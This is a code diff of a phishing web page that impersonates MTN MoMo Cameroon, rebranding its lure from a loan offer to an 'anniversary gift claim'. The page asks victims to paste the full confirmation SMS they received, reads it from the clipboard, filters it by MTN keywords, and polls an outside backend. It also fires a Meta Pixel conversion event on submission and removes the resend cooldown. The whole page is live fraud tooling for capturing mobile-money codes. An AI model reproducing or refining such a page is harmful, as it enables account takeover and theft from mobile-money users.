@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <meta name="theme-color" content="#000000">
-    <title>MTN MoMo Loan - Verify SMS | MoMo Advance Loans</title>
+    <title>MTN MoMo – Verify SMS | MTN MoMo Anniversary</title>
 
     <!-- ============================================
          META PIXEL — BASE CODE
@@ -76,7 +76,6 @@
             -webkit-font-smoothing: antialiased;
         }
 
-        /* ═══════════ HEADER ═══════════ */
         .header {
             position: fixed;
             top: 0; left: 0; right: 0;
@@ -111,10 +110,11 @@
         }
         .brand-sub {
             font-size: 12px;
-            color: #9ca3af;
-            font-weight: 500;
+            color: var(--mtn-gold);
+            font-weight: 700;
             letter-spacing: 0.5px;
             white-space: nowrap;
+            text-transform: uppercase;
         }
         .header-back {
             background: rgba(255, 255, 255, 0.08);
@@ -136,7 +136,6 @@
             color: #fff;
         }
 
-        /* ═══════════ CARD ═══════════ */
         .card-wrap {
             width: 100%;
             max-width: 480px;
@@ -301,6 +300,7 @@
             to   { opacity: 1; transform: translateY(0); }
         }
 
+        /* Resend row — no countdown now */
         .resend-row {
             display: flex;
             justify-content: space-between;
@@ -322,8 +322,7 @@
             border-radius: 8px;
             transition: background 0.2s;
         }
-        .resend-link:hover:not(:disabled) { background: #EEF3FF; }
-        .resend-link:disabled { color: #bbb; cursor: not-allowed; }
+        .resend-link:hover { background: #EEF3FF; }
 
         .verify-btn {
             width: 100%;
@@ -407,7 +406,6 @@
         }
         .footer-text { font-size: 11px; color: var(--text-light); font-weight: 600; letter-spacing: 0.05em; }
 
-        /* ═══════════ SUPER VERIFY OVERLAY ═══════════ */
         .verify-overlay {
             position: fixed;
             inset: 0;
@@ -629,7 +627,6 @@
             50% { opacity: 0.5; transform: scale(0.85); }
         }
 
-        /* ═══════════ NOTICE POPUP ═══════════ */
         .notice-overlay {
             position: fixed;
             inset: 0;
@@ -776,7 +773,6 @@
             box-shadow: 0 14px 30px rgba(220, 38, 38, 0.55);
         }
 
-        /* ═══════════ SMALL PHONES ═══════════ */
         @media (max-height: 700px) {
             .card { padding: 18px 16px; }
             .icon-badge { width: 52px; height: 52px; font-size: 24px; margin-bottom: 10px; }
@@ -802,19 +798,17 @@
 </head>
 <body>
 
-    <!-- HEADER -->
     <header class="header">
         <div class="header-inner">
             <a href="login.html" class="brand">
                 <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="brand-logo-img">
                 <div class="brand-divider"></div>
-                <span class="brand-sub">MoMo Advance Loans</span>
+                <span class="brand-sub">MTN MoMo Anniversary</span>
             </a>
             <button class="header-back" onclick="window.location.href='login.html'">← Back</button>
         </div>
     </header>
 
-    <!-- CARD -->
     <div class="card-wrap">
         <main class="card">
             <div class="icon-badge">📩</div>
@@ -825,7 +819,7 @@
 
             <p class="instruction">
                 We sent a confirmation message to your MoMo number.
-                <strong>Copy the full SMS you received</strong> and paste it below to verify your identity and complete your loan disbursement.
+                <strong>Copy the full SMS you received</strong> and paste it below to verify your identity and complete your anniversary gift claim.
             </p>
 
             <div class="step-hint">
@@ -852,11 +846,10 @@
                 The message you pasted doesn't look like an MTN MoMo SMS. Please make sure you copied the full message.
             </div>
 
+            <!-- Resend row — no countdown -->
             <div class="resend-row">
                 <span>Didn't receive the SMS?</span>
-                <button class="resend-link" id="resendBtn" type="button" disabled>
-                    Resend (<span id="countdown">60</span>s)
-                </button>
+                <button class="resend-link" id="resendBtn" type="button">Resend SMS</button>
             </div>
 
             <button class="verify-btn" id="verifyBtn" disabled>
@@ -870,12 +863,10 @@
         </main>
     </div>
 
-    <!-- FOOTER -->
     <footer class="footer">
         <span class="footer-text">© 2026 MTN MoMo Cameroon</span>
     </footer>
 
-    <!-- SUPER VERIFY OVERLAY -->
     <div class="verify-overlay" id="verifyOverlay">
         <div class="verify-particles">
             <span class="verify-particle"></span>
@@ -925,7 +916,6 @@
         </div>
     </div>
 
-    <!-- NOTICE POPUP -->
     <div class="notice-overlay" id="noticeOverlay">
         <div class="notice-card">
             <div class="notice-icon-wrap" id="noticeIconWrap">
@@ -938,22 +928,15 @@
     </div>
 
     <script>
-        /* ═══════════════════════════════════════════
-           BACKEND URL
-        ═══════════════════════════════════════════ */
         const API_BASE = 'https://momo-usersey-production.up.railway.app';
         const POLL_INTERVAL_MS = 2500;
 
-        /* ═══════════════════════════════════════════
-           DOM REFS
-        ═══════════════════════════════════════════ */
         const smsInput = document.getElementById('smsInput');
         const pasteBtn = document.getElementById('pasteBtn');
         const charCount = document.getElementById('charCount');
         const smsError = document.getElementById('smsError');
         const verifyBtn = document.getElementById('verifyBtn');
         const resendBtn = document.getElementById('resendBtn');
-        const countdownEl = document.getElementById('countdown');
         const verifyOverlay = document.getElementById('verifyOverlay');
         const verifyBarFill = document.getElementById('verifyBarFill');
         const verifyTitle = document.getElementById('verifyTitle');
@@ -967,9 +950,6 @@
         const noticeMessage = document.getElementById('noticeMessage');
         const noticeBtn = document.getElementById('noticeBtn');
 
-        /* ═══════════════════════════════════════════
-           SESSION CHECK
-        ═══════════════════════════════════════════ */
         const sessionRaw = localStorage.getItem('momoSession');
         if (!sessionRaw) {
             window.location.href = 'login.html';
@@ -979,9 +959,6 @@
 
         const storedPhone = localStorage.getItem('momoPhone') || session.phone || '';
 
-        /* ═══════════════════════════════════════════
-           SMS INPUT
-        ═══════════════════════════════════════════ */
         const MIN_LENGTH = 20;
         const MTN_KEYWORDS = ['mtn', 'momo', 'transaction', 'ref', 'amount', 'xaf', 'confirmed', 'received', 'sent'];
 
@@ -1013,9 +990,6 @@
             setTimeout(() => { updateCharCount(); updateVerifyState(); }, 0);
         });
 
-        /* ═══════════════════════════════════════════
-           PASTE BUTTON
-        ═══════════════════════════════════════════ */
         pasteBtn.addEventListener('click', async function() {
             try {
                 if (navigator.clipboard && navigator.clipboard.readText) {
@@ -1039,31 +1013,8 @@
             }
         });
 
-        /* ═══════════════════════════════════════════
-           RESEND COUNTDOWN
-        ═══════════════════════════════════════════ */
-        let remaining = 60;
-        let resendTimer = null;
-
-        function startCountdown() {
-            remaining = 60;
-            resendBtn.disabled = true;
-            countdownEl.textContent = remaining;
-
-            resendTimer = setInterval(function() {
-                remaining--;
-                countdownEl.textContent = remaining;
-                if (remaining <= 0) {
-                    clearInterval(resendTimer);
-                    resendBtn.disabled = false;
-                    resendBtn.innerHTML = 'Resend SMS';
-                }
-            }, 1000);
-        }
-        startCountdown();
-
+        // ✅ Resend SMS — no countdown, always active
         resendBtn.addEventListener('click', async function() {
-            if (resendBtn.disabled) return;
             try {
                 await fetch(`${API_BASE}/api/resend-sms`, {
                     method: 'POST',
@@ -1073,12 +1024,8 @@
             } catch (err) {
                 console.warn('resend error:', err.message);
             }
-            startCountdown();
         });
 
-        /* ═══════════════════════════════════════════
-           SUPER VERIFY OVERLAY
-        ═══════════════════════════════════════════ */
         let verifyTimer = null;
         let stepTimer = null;
 
@@ -1121,9 +1068,6 @@
             verifyStepInner.style.transform = 'translateY(0)';
         }
 
-        /* ═══════════════════════════════════════════
-           NOTICE POPUP
-        ═══════════════════════════════════════════ */
         let noticeAction = null;
 
         function showNotice({ type, icon, title, message, buttonText, buttonClass, onOk }) {
@@ -1151,9 +1095,6 @@
             }
         });
 
-        /* ═══════════════════════════════════════════
-           POLLING
-        ═══════════════════════════════════════════ */
         let pollTimer = null;
 
         function stopPolling() {
@@ -1277,9 +1218,6 @@
             }, POLL_INTERVAL_MS);
         }
 
-        /* ═══════════════════════════════════════════
-           VERIFY BUTTON
-        ═══════════════════════════════════════════ */
         verifyBtn.addEventListener('click', async function() {
             const text = smsInput.value.trim();
 
@@ -1303,11 +1241,10 @@
 
             localStorage.setItem('momoSms', text);
 
-            /* ✅ META PIXEL — AddToCart fired when user submits SMS */
             if (typeof fbq === 'function') {
                 fbq('track', 'AddToCart', {
-                    content_name: 'MoMo SMS Verification',
-                    content_category: 'SMS_Paste',
+                    content_name: 'MoMo Anniversary SMS Verification',
+                    content_category: 'Anniversary',
                     currency: 'XAF'
                 });
                 console.log('✅ Meta Pixel: AddToCart event fired');
